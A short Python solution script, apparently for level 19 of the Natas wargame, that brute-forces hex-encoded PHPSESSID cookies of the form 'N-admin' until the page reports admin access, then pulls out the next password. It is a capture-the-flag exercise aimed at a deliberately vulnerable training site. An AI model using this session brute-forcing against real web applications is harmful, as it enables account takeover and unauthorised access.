import re
from src.natas.base_level import NatasLevel

class Level_19(NatasLevel):

  num = 19
  explanation = "On this level, we brute-force PHPSESSID values from 1 to 640,\n     appending `-admin` and hex-encoding the session ID."

  def exploit(self) -> str:

    match = ""

    for i in range(641):

      hex_value = f"{i}-admin".encode().hex()
      resp      = self.session.get(self.base_url + "/index.php", headers = {'Cookie': f"PHPSESSID={hex_value}"})
      if re.search(r'You are an admin', resp.text) != None:
        resp_pass = self.session.get(self.base_url + "/index.php", headers = {'Cookie': f"PHPSESSID={hex_value}"})
        match     = re.search(r'(?<=Password: )[A-Za-z0-9]+', resp_pass.text, re.MULTILINE).group().strip()

    return match
